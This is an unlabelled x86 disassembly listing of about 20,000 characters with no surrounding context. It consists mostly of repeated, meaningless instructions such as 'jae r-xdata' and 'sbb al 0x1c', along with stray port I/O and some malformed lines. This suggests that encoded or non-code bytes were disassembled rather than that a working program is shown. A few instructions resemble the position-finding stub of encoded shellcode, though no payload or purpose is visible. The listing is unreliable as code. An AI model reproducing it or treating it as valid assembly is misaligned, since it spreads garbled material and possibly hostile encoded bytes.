sbb al 0x1c
push 0x6ab3b3a5
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
in eax dx
jmp 0x68fd37b9
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x68
mov dh 0xef
sbb ecx [ ebx - 0x1c1c1d19 ]
or bl [ edi + edi + 0x73731c1c ]
jae r-xdata
jae r-xdata
mov [ ebp + 0x9a66a85 ] ecx
mov ebx 0x6a859789
jae r-xdata
loop r-xdata
jae r-xdata
xchg ecx eax
pop ebx
and al 0xa6
in al dx
mov [ 0x1c24 ] al
jae r-xdata
sbb al 0x66
and ecx [ edx ]
0x731c1c02 0x8a89
sbb al 0x1c
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
adc ecx [ edx ]
or [ esp + ebx ] ah
or [ bp + di ] esi
sbb al 0x1c
mov bl 0xa
add dh [ ebx ]
sbb al 0x1c
jae r-xdata
push 0x2366f3a0
in al dx
mov ebp 0x89202ab8
mov al [ ebp - 0x44f25996 ]
mov ebx eax
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
pushad
lahf
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btc [ ecx + 0x3a760a8a ] ecx
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x97
jae r-xdata
and ebp esp
mov ebx esp
mov bl 0xa
fnstenv [ ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov esp 0x2366b8bd
in al dx
xchg ebp eax
sub bl [ esp + ebx ]
xchg ecx eax
xchg ebp eax
retn
and bp sp
sbb al 0x73
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
and al 0x1c
imul esp
jmp r-xdata
jae r-xdata
mov dh 0xe9
jae r-xdata
jae r-xdata
mul edx
jae r-xdata
jae r-xdata
jecxz r-xdata
adc edi [ ebx - 0x6ff53977 ]
jecxz r-xdata
sub ah [ eax ]
jae r-xdata
aas
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0xf3
outsb
nop [ esp + ebx ] bx
or edi ecx
or [ esp + ebx ] ebx
push 0xf10befb6
shl [ ebx ] 0x1
jae r-xdata
mov dh 0x68
jae r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
mov edx 0x6a858d89
scasb [ edi ]
or eax 0x1c0d2c0a
sbb al 0x68
cmp ecx [ ebx - 0x69ef9a79 ]
mov ah 0x6a
mov ebp 0xa8d0bab
sbb al 0x1c
std
punpcklbw mmx0 [ edi ]
sbb esp [ edx + 0xf ]
adc edi [ ebx - 0x33f56c77 ]
test [ edx - 0x5a ] ebp
jae r-xdata
or [ ebx + 0x6a859789 ] edi
cmpsb [ esi ] [ edi ]
or edi [ ecx ]
and bl [ esp + ebx ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
popad
and [ ebx ] ah
shl [ ebx ] 0x1
mov esp 0x7373202a
push 0xe21c601a
in al dx
or ax 0x1c1c
ficomp [ esi - 0x21991309 ]
or [ esp + ebx ] ebx
or ch [ edi + 0x731c1c16 ]
jae r-xdata
jae r-xdata
or edi [ edi + 0x601c1c2f ]
daa
out dx eax
mov ebp ebx
loope r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
in al dx
jne r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx + 0x740a8a89 ] edi
pop ss
push 0xffffffa6
jae r-xdata
mov [ edx + 0xda66a85 ] ecx
mov ebx 0x6a85c389
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
push ss
outsb
jae r-xdata
jae r-xdata
mov [ 0x1c01360a ] eax
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
pop ds
and eax 0xab41c1c
adc [ edx ] dh
sbb al 0x1c
in al dx
and [ edx ] cl
xchg esi eax
sbb al 0x1c
jae r-xdata
jae r-xdata
insd
push ds
sbb al 0x1c
or dl [ esi + 0x731c1c33 ]
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or ah [ ecx + 0x731c1c0b ]
jecxz r-xdata
outsb
scasb [ edi ]
cmp ebp [ esi - 0x5a ]
dec ebx
or edi [ edx + 0xae3e3e1 ]
jo r-xdata
das
mov ebx [ edx - 0x59db796d ]
xor edx [ ecx + 0xbc3c395 ]
mov ecx fs
cmpsb [ esi ] [ edi ]
sub edx [ ebx + 0x24c38f91 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
mov bh 0xb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ edx + edx + 0x73731c1c ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jne r-xdata
outsb
jecxz r-xdata
mov esp 0x202ab8bd
cmpsb [ esi ] [ edi ]
push 0xffffff9e
or eax 0x6a853568
mov dh 0xd9
push 0x9e6a851b
adc ebp [ eax + 0x33 ]
test [ edx - 0x4a ] ebp
fild [ eax + 0x1a ]
push 0x9e6a8532
adc [ ebp + 0x68ddb66a ] eax
sbb ebp [ eax + 0x33 ]
test [ edx - 0x42 ] ebp
add [ edx ] ecx
pop es
pop ebp
sbb al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
or ah [ edx ]
out dx al
jecxz r-xdata
cmp [ edx ] esp
sbb al 0x1c
loop r-xdata
jae r-xdata
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffbe
pop ds
mov esi 0xe7b51c1f
jae r-xdata
sti
jecxz r-xdata
jne r-xdata
jae r-xdata
and eax 0x1c1e6d0b
sbb al 0xa
xchg esi eax
xor ebx [ esp + ebx ]
jae r-xdata
or cl [ edi + ebp + 0x1c ]
sbb al 0x73
mov ebx 0xcc0a9389
sbb al 0x1c
or dh [ esi + 0x3a ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb0
movsb [ edi ] [ esi ]
sbb al 0x75
dec edi
jecxz r-xdata
or bh [ ebp - 0x7ae3e3d3 ]
jae r-xdata
mov edx 0x67ec2366
jmp 0xffffffffd12a3b3e
jae r-xdata
in al dx
sbb eax 0x8561ecc3
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or dl ch
adc [ esp + ebx ] bl
adc bl [ esp + ebx ]
jae r-xdata
jae r-xdata
mov esi eax
or dl [ eax + 0x73e3e3e3 ]
sbb al 0x73
mov [ edx + 0x11a66a85 ] ecx
mov ebx 0x1c3f160a
jmp r-xdata
jbe r-xdata
sbb al 0xec
jae r-xdata
or eax 0x85c389bb
push 0xffffffa6
cmpsb [ esi ] [ edi ]
mov [ ecx - 0x59957a45 ] eax
sbb ecx [ ecx + 0x6a85bb90 ]
cmp bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or al [ edi - 0x13e3e3c9 ]
outsb
mov ah 0xb0
or cl [ edx + edx + 0x73731c1c ]
sbb al 0xa
daa
out 0xe3 eax
sub al 0x1c
sbb al 0x1c
jae r-xdata
sbb al 0xb5
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
sbb al 0x96
outsb
cmpsb [ esi ] [ edi ]
aas
mov bl 0x68
and eax 0x1c58070b
sbb al 0xba
and bp sp
jae r-xdata
jae r-xdata
mov dl 0xa
aad 0x10
sbb al 0x1c
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0x1c
sub eax 0x6a851c1c
mov esi 0xb88e891d
jae r-xdata
jmp 0xffffffffd12a3b3e
and ebp esp
jae r-xdata
jecxz r-xdata
sar [ ebx + 0x2b689b89 ] 0x85
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
or dl [ esi ]
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0x1c
sbb ax 0xe3eb
or ah [ ecx ]
mov [ edx + ebp * 2 ] ebx
sahf
sbb ebx [ esi * 2 - 0x1c1c1c91 ]
and cx [ edx ]
mov ecx 0x731c1c08
jae r-xdata
mov ebp edi
jecxz r-xdata
ja r-xdata
push 0x1b07600f
bound ecx [ edi ]
jae r-xdata
jae r-xdata
daa
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
iretd
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xffffffbe
sbb eax 0xab88e89
push es
sbb al 0x85
jae r-xdata
sub ah [ eax ]
sbb al 0x1c
mov esp 0x737320bd
jae r-xdata
insb
sub ebx [ esp + ebx ]
mov [ ebx + 0x6a852b68 ] ebx
scasb [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
aas
mov ebx 0x1c0ba10a
cmpsb [ esi ] [ edi ]
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffa6
jae r-xdata
pushad
daa
out dx eax
fidivr [ edi + 0x67ecf7c7 ]
jmp r-xdata
jae r-xdata
jae r-xdata
popad
sbb al 0x1c
dec ebx
mov ch 0xa
pop esp
sub [ esp + ebx ] ebx
test [ edx - 0x52 ] ebp
jae r-xdata
sahf
sbb ebx [ esi * 4 + 0x603b68db ]
sbb [ esp + ebp * 8 ] bl
jecxz r-xdata
push 0xa66a8525
jae r-xdata
push 0xbc0aeba6
push 0xae6a852b
jae r-xdata
mov ebx 0x2b689b89
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
pushad
sbb eax 0xab681c1c
jmp r-xdata
fsubr st6
test [ edx - 0x5a ] ebp
test [ edx - 0x52 ] ebp
jae r-xdata
fwait
jae r-xdata
and eax 0xc1a66a85
jae r-xdata
pushad
jae r-xdata
or [ si ] bl
sbb al 0x1c
pushad
sahf
pop ds
out 0xec eax
outsd
add bl [ esp + ebx ]
sbb al 0xa
xlat
or al 0x1c
sbb al 0xa
jno r-xdata
cmp esp [ eax + 0x18 ]
sbb al 0xec
pushad
sbb dl cl
in al dx
sub al 0x1d
sbb al 0x1c
push 0x2468ebab
or esi [ edi + 0xa1c1c25 ]
mov ch 0x4
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
loop r-xdata
sub eax [ ebp - 0x45385196 ]
mov [ ecx + 0x6a853a68 ] edx
mov esi 0x853b68c5
push 0xffffffbe
jae r-xdata
mov bl 0xec
jae r-xdata
jae r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
sbb al 0x73
jecxz r-xdata
push 0xffffffae
mov edx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
mov eax 0x1c06670a
or ah [ edi + 0x6 ]
jmp r-xdata
arpl [ esi + edx * 4 ] bx
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x1c
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
retn
jae r-xdata
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
mov ah 0xaf
jae r-xdata
jae r-xdata

push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp
and bp sp
sbb al 0xb4
scasd [ edi ]
jae r-xdata
nop
and al 0xa6
jae r-xdata
0x1c13
in al dx
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
and [ ebp - 0x44025996 ] eax
mov ebp ecx
mov ebp 0x6a858689
rol ebx 0xc1
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
jae r-xdata
jae r-xdata
mov edx 0xece11b60
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
push 0xffffffb6
aas
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
mov ebp 0x1c29ec0a
sbb al 0x73
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x1c
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
jecxz r-xdata
jae r-xdata
ja r-xdata
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov bh 0xb
jae r-xdata
sbb al 0x73
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
cdq
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
in al dx
push esp
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
loop r-xdata
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jmp 0xffffffffe3db145e
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
loop r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0xb0
or cl dh
lahf
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
btr [ edx ] ecx
jae r-xdata
push 0xb30f620f
loope r-xdata
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
iretd
jae r-xdata
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
sbb al 0x1c
fistp [ ebx ]
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
